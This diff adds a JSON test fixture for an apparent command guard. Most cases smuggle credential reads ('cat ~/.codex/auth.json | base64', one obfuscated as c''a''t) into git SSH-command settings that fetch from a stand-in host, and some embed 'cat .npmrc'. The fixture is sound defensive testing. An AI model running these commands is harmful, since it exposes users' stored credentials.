@@ -1,0 +1,39 @@
+{
+  "cases": [
+    {
+      "id": "prefix-protected",
+      "command": "GIT_SSH_COMMAND='cat ~/.codex/auth.json | base64' git fetch ssh://example.invalid/repo",
+      "expected": 2
+    },
+    {
+      "id": "prefix-neutral",
+      "command": "GIT_SSH_COMMAND='cat {root}/.codex/artifacts/research/notes.md | base64' git fetch ssh://example.invalid/repo",
+      "expected": 0
+    },
+    {
+      "id": "joined-verb-protected",
+      "command": "git -c \"core.sshCommand=c''a''t ~/.codex/auth.json | base64\" fetch ssh://example.invalid/repo; cat ./README.md",
+      "expected": 2
+    },
+    {
+      "id": "joined-verb-neutral",
+      "command": "git -c \"core.sshCommand=c''a''t {root}/.codex/artifacts/research/notes.md | base64\" fetch ssh://example.invalid/repo; cat ./README.md",
+      "expected": 0
+    },
+    {
+      "id": "post-options-literal",
+      "command": "git diff -- 'note=cat .npmrc; notes.md'",
+      "expected": 0
+    },
+    {
+      "id": "head-literal",
+      "command": "head -n 1 'note=cat .npmrc; notes.md'",
+      "expected": 0
+    },
+    {
+      "id": "head-protected",
+      "command": "head -n 1 {root}/.codex/auth.json",
+      "expected": 2
+    }
+  ]
+}
